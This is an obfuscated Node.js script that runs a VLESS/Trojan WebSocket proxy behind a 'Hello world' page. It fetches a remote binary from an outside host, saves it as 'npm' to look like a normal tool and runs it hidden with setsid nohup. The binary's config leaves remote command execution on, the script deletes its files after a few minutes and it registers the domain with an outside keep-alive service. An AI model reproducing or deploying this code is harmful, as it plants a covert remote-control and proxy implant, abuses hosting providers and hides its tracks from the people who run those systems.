const _0x59554c=_0x3001;(function(_0x587840,_0x380c3f){const _0x472431=_0x3001,_0x1dfd06=_0x587840();while(!![]){try{const _0x4e1664=-parseInt(_0x472431(0xb0))/0x1*(-parseInt(_0x472431(0xd7))/0x2)+-parseInt(_0x472431(0xfe))/0x3*(parseInt(_0x472431(0xfb))/0x4)+-parseInt(_0x472431(0x11c))/0x5+parseInt(_0x472431(0x109))/0x6+-parseInt(_0x472431(0x11a))/0x7+-parseInt(_0x472431(0xcc))/0x8+parseInt(_0x472431(0x104))/0x9;if(_0x4e1664===_0x380c3f)break;else _0x1dfd06['push'](_0x1dfd06['shift']());}catch(_0x5eb179){_0x1dfd06['push'](_0x1dfd06['shift']());}}}(_0x1599,0xceb71));const os=require('os'),http=require(_0x59554c(0xd0)),fs=require('fs'),axios=require(_0x59554c(0x10b)),net=require(_0x59554c(0xe0)),path=require(_0x59554c(0xdc)),crypto=require(_0x59554c(0xaa)),{Buffer}=require(_0x59554c(0x115)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x59554c(0xcf)][_0x59554c(0xc2)]||_0x59554c(0xbf),NEZHA_SERVER=process['env'][_0x59554c(0xec)]||'',NEZHA_PORT=process[_0x59554c(0xcf)]['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0x59554c(0xbe)]||'',DOMAIN=process['env'][_0x59554c(0xba)]||_0x59554c(0xcb),AUTO_ACCESS=process[_0x59554c(0xcf)][_0x59554c(0xb4)]||!![],WSPATH=process[_0x59554c(0xcf)][_0x59554c(0xd5)]||UUID[_0x59554c(0xea)](0x0,0x8),SUB_PATH=process[_0x59554c(0xcf)][_0x59554c(0xc0)]||_0x59554c(0x10e),NAME=process[_0x59554c(0xcf)]['NAME']||'',PORT=process['env'][_0x59554c(0xff)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x483056=_0x59554c;try{const _0x25eb35=await axios[_0x483056(0xe9)](_0x483056(0xd1)),_0x4f44a4=_0x25eb35[_0x483056(0x106)];ISP=(_0x4f44a4[_0x483056(0xfc)]+'-'+_0x4f44a4[_0x483056(0xdb)])[_0x483056(0xb8)](/ /g,'_');}catch(_0x5b9a1a){ISP=_0x483056(0xf7);}};GetISP();const httpServer=http['createServer']((_0x4d934c,_0x3c7157)=>{const _0x1cd12d=_0x59554c;if(_0x4d934c[_0x1cd12d(0x111)]==='/'){const _0x43b31f=path[_0x1cd12d(0xbc)](__dirname,'index.html');fs[_0x1cd12d(0xdd)](_0x43b31f,_0x1cd12d(0xbb),(_0x3916dc,_0x39bc7b)=>{const _0xa3b33=_0x1cd12d;if(_0x3916dc){_0x3c7157[_0xa3b33(0xe2)](0xc8,{'Content-Type':'text/html'}),_0x3c7157[_0xa3b33(0xf2)]('Hello\x20world!');return;}_0x3c7157[_0xa3b33(0xe2)](0xc8,{'Content-Type':_0xa3b33(0xac)}),_0x3c7157['end'](_0x39bc7b);});return;}else{if(_0x4d934c['url']==='/'+SUB_PATH){const _0x46859f=NAME?NAME+'-'+ISP:ISP,_0x25b469=_0x1cd12d(0x105)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x1cd12d(0xee)+DOMAIN+_0x1cd12d(0xb6)+WSPATH+'#'+_0x46859f,_0x4a3bb4='trojan://'+UUID+'@'+DOMAIN+_0x1cd12d(0xfd)+DOMAIN+_0x1cd12d(0xee)+DOMAIN+_0x1cd12d(0xb6)+WSPATH+'#'+_0x46859f,_0x1e0565=_0x25b469+'\x0a'+_0x4a3bb4,_0xe4a911=Buffer[_0x1cd12d(0xb9)](_0x1e0565)['toString']('base64');_0x3c7157['writeHead'](0xc8,{'Content-Type':_0x1cd12d(0x100)}),_0x3c7157[_0x1cd12d(0xf2)](_0xe4a911+'\x0a');}else _0x3c7157[_0x1cd12d(0xe2)](0x194,{'Content-Type':_0x1cd12d(0x100)}),_0x3c7157['end'](_0x1cd12d(0xd2));}}),wss=new WebSocket[(_0x59554c(0xde))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x59554c(0x121),'1.1.1.1'];function resolveHost(_0x4921a8){return new Promise((_0x4d2ef1,_0x20c522)=>{const _0x538565=_0x3001;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x538565(0xe1)](_0x4921a8)){_0x4d2ef1(_0x4921a8);return;}let _0x3cd49a=0x0;function _0x5e3280(){const _0x56f5b1=_0x538565;if(_0x3cd49a>=DNS_SERVERS[_0x56f5b1(0xc1)]){_0x20c522(new Error('Failed\x20to\x20resolve\x20'+_0x4921a8+_0x56f5b1(0xe7)));return;}const _0x103a0d=DNS_SERVERS[_0x3cd49a];_0x3cd49a++;const _0x25da26=_0x56f5b1(0xab)+encodeURIComponent(_0x4921a8)+_0x56f5b1(0xd4);axios[_0x56f5b1(0xe9)](_0x25da26,{'timeout':0x1388,'headers':{'Accept':_0x56f5b1(0x11d)}})[_0x56f5b1(0x11f)](_0x264d02=>{const _0x414e44=_0x56f5b1,_0x3d3dba=_0x264d02[_0x414e44(0x106)];if(_0x3d3dba['Status']===0x0&&_0x3d3dba[_0x414e44(0xe6)]&&_0x3d3dba[_0x414e44(0xe6)][_0x414e44(0xc1)]>0x0){const _0x276f7f=_0x3d3dba[_0x414e44(0xe6)][_0x414e44(0xad)](_0x4ba028=>_0x4ba028[_0x414e44(0xc6)]===0x1);if(_0x276f7f){_0x4d2ef1(_0x276f7f[_0x414e44(0x106)]);return;}}_0x5e3280();})[_0x56f5b1(0xe4)](_0x306c0d=>{_0x5e3280();});}_0x5e3280();});}function handleVlessConnection(_0x2bf656,_0x122536){const _0x5ce992=_0x59554c,[_0xdb5bbc]=_0x122536,_0x280824=_0x122536[_0x5ce992(0xea)](0x1,0x11);if(!_0x280824['every']((_0x3746aa,_0xf13ab8)=>_0x3746aa==parseInt(uuid['substr'](_0xf13ab8*0x2,0x2),0x10)))return![];let _0x230425=_0x122536[_0x5ce992(0xea)](0x11,0x12)[_0x5ce992(0xae)]()+0x13;const _0xf3bd94=_0x122536[_0x5ce992(0xea)](_0x230425,_0x230425+=0x2)[_0x5ce992(0xc5)](0x0),_0x2cd39a=_0x122536[_0x5ce992(0xea)](_0x230425,_0x230425+=0x1)[_0x5ce992(0xae)](),_0x30752f=_0x2cd39a==0x1?_0x122536[_0x5ce992(0xea)](_0x230425,_0x230425+=0x4)[_0x5ce992(0xbc)]('.'):_0x2cd39a==0x2?new TextDecoder()[_0x5ce992(0xdf)](_0x122536[_0x5ce992(0xea)](_0x230425+0x1,_0x230425+=0x1+_0x122536['slice'](_0x230425,_0x230425+0x1)[_0x5ce992(0xae)]())):_0x2cd39a==0x3?_0x122536[_0x5ce992(0xea)](_0x230425,_0x230425+=0x10)[_0x5ce992(0xef)]((_0x3e745d,_0x446ff0,_0x221d53,_0x108994)=>_0x221d53%0x2?_0x3e745d[_0x5ce992(0x103)](_0x108994[_0x5ce992(0xea)](_0x221d53-0x1,_0x221d53+0x1)):_0x3e745d,[])[_0x5ce992(0xf1)](_0x36cb98=>_0x36cb98[_0x5ce992(0xc5)](0x0)[_0x5ce992(0xb7)](0x10))[_0x5ce992(0xbc)](':'):'';_0x2bf656[_0x5ce992(0xc9)](new Uint8Array([_0xdb5bbc,0x0]));const _0x35d580=createWebSocketStream(_0x2bf656);return resolveHost(_0x30752f)[_0x5ce992(0x11f)](_0x29a9b4=>{const _0x24c3cd=_0x5ce992;net[_0x24c3cd(0x11b)]({'host':_0x29a9b4,'port':_0xf3bd94},function(){const _0x192e41=_0x24c3cd;this[_0x192e41(0x10a)](_0x122536['slice'](_0x230425)),_0x35d580['on']('error',()=>{})[_0x192e41(0x110)](this)['on'](_0x192e41(0xd9),()=>{})[_0x192e41(0x110)](_0x35d580);})['on'](_0x24c3cd(0xd9),()=>{});})[_0x5ce992(0xe4)](_0x393b69=>{const _0x49eec7=_0x5ce992;net[_0x49eec7(0x11b)]({'host':_0x30752f,'port':_0xf3bd94},function(){const _0xbe1548=_0x49eec7;this[_0xbe1548(0x10a)](_0x122536[_0xbe1548(0xea)](_0x230425)),_0x35d580['on'](_0xbe1548(0xd9),()=>{})[_0xbe1548(0x110)](this)['on'](_0xbe1548(0xd9),()=>{})[_0xbe1548(0x110)](_0x35d580);})['on'](_0x49eec7(0xd9),()=>{});}),!![];}function handleTrojanConnection(_0x45422d,_0x4cf887){const _0xdce479=_0x59554c;try{if(_0x4cf887['length']<0x3a)return![];const _0x4e5202=_0x4cf887['slice'](0x0,0x38)[_0xdce479(0xb7)](),_0x31516f=[UUID];let _0x18a74f=null;for(const _0x465f6c of _0x31516f){const _0x2d03fe=crypto['createHash'](_0xdce479(0xcd))[_0xdce479(0x101)](_0x465f6c)['digest']('hex');if(_0x2d03fe===_0x4e5202){_0x18a74f=_0x465f6c;break;}}if(!_0x18a74f)return![];let _0x5a7c0d=0x38;_0x4cf887[_0x5a7c0d]===0xd&&_0x4cf887[_0x5a7c0d+0x1]===0xa&&(_0x5a7c0d+=0x2);const _0x11e37b=_0x4cf887[_0x5a7c0d];if(_0x11e37b!==0x1)return![];_0x5a7c0d+=0x1;const _0x41bdf7=_0x4cf887[_0x5a7c0d];_0x5a7c0d+=0x1;let _0x1572c8,_0x316ef6;if(_0x41bdf7===0x1)_0x1572c8=_0x4cf887[_0xdce479(0xea)](_0x5a7c0d,_0x5a7c0d+0x4)[_0xdce479(0xbc)]('.'),_0x5a7c0d+=0x4;else{if(_0x41bdf7===0x3){const _0x55a1f4=_0x4cf887[_0x5a7c0d];_0x5a7c0d+=0x1,_0x1572c8=_0x4cf887[_0xdce479(0xea)](_0x5a7c0d,_0x5a7c0d+_0x55a1f4)[_0xdce479(0xb7)](),_0x5a7c0d+=_0x55a1f4;}else{if(_0x41bdf7===0x4)_0x1572c8=_0x4cf887[_0xdce479(0xea)](_0x5a7c0d,_0x5a7c0d+0x10)['reduce']((_0x16e82b,_0x4df387,_0x46d38d,_0x250464)=>_0x46d38d%0x2?_0x16e82b[_0xdce479(0x103)](_0x250464[_0xdce479(0xea)](_0x46d38d-0x1,_0x46d38d+0x1)):_0x16e82b,[])[_0xdce479(0xf1)](_0x2b7016=>_0x2b7016[_0xdce479(0xc5)](0x0)[_0xdce479(0xb7)](0x10))['join'](':'),_0x5a7c0d+=0x10;else return![];}}_0x316ef6=_0x4cf887[_0xdce479(0xc5)](_0x5a7c0d),_0x5a7c0d+=0x2;_0x5a7c0d<_0x4cf887['length']&&_0x4cf887[_0x5a7c0d]===0xd&&_0x4cf887[_0x5a7c0d+0x1]===0xa&&(_0x5a7c0d+=0x2);const _0x2d1efe=createWebSocketStream(_0x45422d);return resolveHost(_0x1572c8)[_0xdce479(0x11f)](_0x37ca99=>{const _0x39ed61=_0xdce479;net[_0x39ed61(0x11b)]({'host':_0x37ca99,'port':_0x316ef6},function(){const _0x18b2d0=_0x39ed61;_0x5a7c0d<_0x4cf887[_0x18b2d0(0xc1)]&&this[_0x18b2d0(0x10a)](_0x4cf887['slice'](_0x5a7c0d)),_0x2d1efe['on'](_0x18b2d0(0xd9),()=>{})[_0x18b2d0(0x110)](this)['on']('error',()=>{})['pipe'](_0x2d1efe);})['on'](_0x39ed61(0xd9),()=>{});})['catch'](_0x3f7833=>{const _0x3c86ec=_0xdce479;net['connect']({'host':_0x1572c8,'port':_0x316ef6},function(){const _0xb6a9e8=_0x3001;_0x5a7c0d<_0x4cf887[_0xb6a9e8(0xc1)]&&this[_0xb6a9e8(0x10a)](_0x4cf887['slice'](_0x5a7c0d)),_0x2d1efe['on']('error',()=>{})[_0xb6a9e8(0x110)](this)['on']('error',()=>{})[_0xb6a9e8(0x110)](_0x2d1efe);})['on'](_0x3c86ec(0xd9),()=>{});}),!![];}catch(_0x390c33){return![];}}function _0x1599(){const _0x22551d=['https://amd64.ssss.nyc.mn/agent','NEZHA_KEY','4ba93dcc-d979-4d00-afa3-dfe76962b1cf','SUB_PATH','length','UUID','unlink','finish','readUInt16BE','type','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','close','send','substr','1234.abc.com','10811576ioQEPj','sha224','includes','env','http','https://api.ip.sb/geoip','Not\x20Found\x0a','application/json','&type=A','WSPATH','https://arm64.ssss.nyc.mn/v1','346sOcxMy','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','error','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','isp','path','readFile','Server','decode','net','test','writeHead','2087','catch','8443','Answer','\x20with\x20all\x20DNS\x20servers','aarch64','get','slice','Server\x20is\x20running\x20on\x20port\x20','NEZHA_SERVER','arm64','&fp=chrome&type=ws&host=','reduce','once','map','end','2096','setsid\x20nohup\x20./npm\x20-s\x20','every','listen','Unknown','log','npm\x20download\x20successfully','trim','6476GbJWGZ','country_code',':443?security=tls&sni=','1641tTeBpg','PORT','text/plain','update','arch','concat','42430284mwEJXL','vless://','data','split','post','6106884DWUmuS','write','axios','npm\x20is\x20already\x20running,\x20skip\x20running...','npm\x20running\x20error:','sub','2053','pipe','url','\x20-p\x20','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','443','buffer','true','error:\x20','https://amd64.ssss.nyc.mn/v1','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','11538219bpGlIQ','connect','7728485vweOEz','application/dns-json','arm','then','/bin/bash','8.8.4.4','Automatic\x20Access\x20Task\x20added\x20successfully','crypto','https://dns.google/resolve?name=','text/html','find','readUInt8','chmod\x20+x\x20npm','3153nUcQXj','config.yaml','false','client_secret:\x20','AUTO_ACCESS','https://','&path=%2F','toString','replace','from','DOMAIN','utf8','join'];_0x1599=function(){return _0x22551d;};return _0x1599();}wss['on']('connection',(_0x3ba1d8,_0xdd52d9)=>{const _0x5cf594=_0x59554c,_0x259b59=_0xdd52d9[_0x5cf594(0x111)]||'';_0x3ba1d8[_0x5cf594(0xf0)]('message',_0x5b095b=>{const _0x49c282=_0x5cf594;if(_0x5b095b[_0x49c282(0xc1)]>0x11&&_0x5b095b[0x0]===0x0){const _0x323367=_0x5b095b[_0x49c282(0xea)](0x1,0x11),_0xa1499f=_0x323367[_0x49c282(0xf5)]((_0x555a9b,_0x32d6a8)=>_0x555a9b==parseInt(uuid[_0x49c282(0xca)](_0x32d6a8*0x2,0x2),0x10));if(_0xa1499f){!handleVlessConnection(_0x3ba1d8,_0x5b095b)&&_0x3ba1d8[_0x49c282(0xc8)]();return;}}!handleTrojanConnection(_0x3ba1d8,_0x5b095b)&&_0x3ba1d8[_0x49c282(0xc8)]();})['on'](_0x5cf594(0xd9),()=>{});});const getDownloadUrl=()=>{const _0x13cd26=_0x59554c,_0x2b6bea=os[_0x13cd26(0x102)]();return _0x2b6bea===_0x13cd26(0x11e)||_0x2b6bea===_0x13cd26(0xed)||_0x2b6bea===_0x13cd26(0xe8)?!NEZHA_PORT?_0x13cd26(0xd6):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x13cd26(0x118):_0x13cd26(0xbd);},downloadFile=async()=>{const _0x460e4a=_0x59554c;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x363fe3=getDownloadUrl(),_0xbe169=await axios({'method':_0x460e4a(0xe9),'url':_0x363fe3,'responseType':'stream'}),_0x3c3052=fs['createWriteStream']('npm');return _0xbe169[_0x460e4a(0x106)][_0x460e4a(0x110)](_0x3c3052),new Promise((_0x51daf6,_0x485f19)=>{const _0xa1cf3=_0x460e4a;_0x3c3052['on'](_0xa1cf3(0xc4),()=>{const _0x287986=_0xa1cf3;console['log'](_0x287986(0xf9)),exec(_0x287986(0xaf),_0x412647=>{if(_0x412647)_0x485f19(_0x412647);_0x51daf6();});}),_0x3c3052['on'](_0xa1cf3(0xd9),_0x485f19);});}catch(_0x239095){throw _0x239095;}},runnz=async()=>{const _0x42636c=_0x59554c;try{const _0x31799f=execSync(_0x42636c(0xd8),{'encoding':'utf-8'});if(_0x31799f[_0x42636c(0xfa)]()!==''){console['log'](_0x42636c(0x10c));return;}}catch(_0x2c9fc8){}await downloadFile();let _0xe920a='',_0x4db52b=[_0x42636c(0x114),_0x42636c(0xe5),_0x42636c(0xf3),_0x42636c(0xe3),'2083',_0x42636c(0x10f)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x3231a9=_0x4db52b[_0x42636c(0xce)](NEZHA_PORT)?'--tls':'';_0xe920a=_0x42636c(0xf4)+NEZHA_SERVER+':'+NEZHA_PORT+_0x42636c(0x112)+NEZHA_KEY+'\x20'+_0x3231a9+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4fb4e6=NEZHA_SERVER[_0x42636c(0xce)](':')?NEZHA_SERVER[_0x42636c(0x107)](':')['pop']():'',_0x442a0c=_0x4db52b[_0x42636c(0xce)](_0x4fb4e6)?_0x42636c(0x116):_0x42636c(0xb2),_0x1e5e84=_0x42636c(0xb3)+NEZHA_KEY+_0x42636c(0xc7)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x442a0c+_0x42636c(0xda)+UUID;fs['writeFileSync'](_0x42636c(0xb1),_0x1e5e84);}_0xe920a=_0x42636c(0x119);}else{console['log'](_0x42636c(0x113));return;}}try{exec(_0xe920a,{'shell':_0x42636c(0x120)},_0x52811b=>{const _0x2aae1b=_0x42636c;if(_0x52811b)console[_0x2aae1b(0xd9)](_0x2aae1b(0x10d),_0x52811b);else console[_0x2aae1b(0xf8)]('npm\x20is\x20running');});}catch(_0x585a63){console['error'](_0x42636c(0x117)+_0x585a63);}};async function addAccessTask(){const _0x58d3af=_0x59554c;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x237ccb=_0x58d3af(0xb5)+DOMAIN;try{const _0x5e8db8=await axios[_0x58d3af(0x108)]('https://oooo.serv00.net/add-url',{'url':_0x237ccb},{'headers':{'Content-Type':_0x58d3af(0xd3)}});console[_0x58d3af(0xf8)](_0x58d3af(0x122));}catch(_0x57b30b){}}function _0x3001(_0x3a6d31,_0x4f7d0b){_0x3a6d31=_0x3a6d31-0xaa;const _0x159986=_0x1599();let _0x30018a=_0x159986[_0x3a6d31];return _0x30018a;}const delFiles=()=>{const _0x46ddf8=_0x59554c;fs['unlink']('npm',()=>{}),fs[_0x46ddf8(0xc3)](_0x46ddf8(0xb1),()=>{});};httpServer[_0x59554c(0xf6)](PORT,()=>{const _0x5bce84=_0x59554c;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x5bce84(0xf8)](_0x5bce84(0xeb)+PORT);});
